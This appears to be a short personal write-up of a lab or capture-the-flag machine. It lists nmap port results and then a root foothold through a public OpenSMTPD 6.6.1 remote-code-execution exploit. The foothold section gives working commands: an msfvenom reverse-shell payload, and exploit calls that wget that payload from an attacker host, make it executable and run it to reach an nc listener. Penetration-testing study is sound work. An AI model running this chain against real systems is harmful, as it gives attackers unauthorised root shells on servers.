## OPEN PORTS
```bash
22/tcp  open   ssh         syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp  open   smtp        syn-ack ttl 61 OpenSMTPD
53/tcp  closed domain      reset ttl 61
80/tcp  open   http        syn-ack ttl 61 nginx 1.14.0 (Ubuntu)
445/tcp open   netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
```
## INITIAL FOOTHOLD
```bash
# SMTP - OpenSMTPD

- Check for OpenSMTPD Exploits RCE

# Exploit - poc
OpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.py

# Exploit
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.203 LPORT=80 -f elf -o shell2.elf
- Host on port 80

python3 47984.py $ip 25 'wget 192.168.45.203:445/shell2.elf'
python3 47984.py $ip 25 'chmod +x ./shell2.elf'

- Close and start listener at port 80 with nc
python3 47984.py $ip 25 './shell2.elf'

# root
```
## NOTE
```bash
- Dont forget to search exploits for ports service versions
```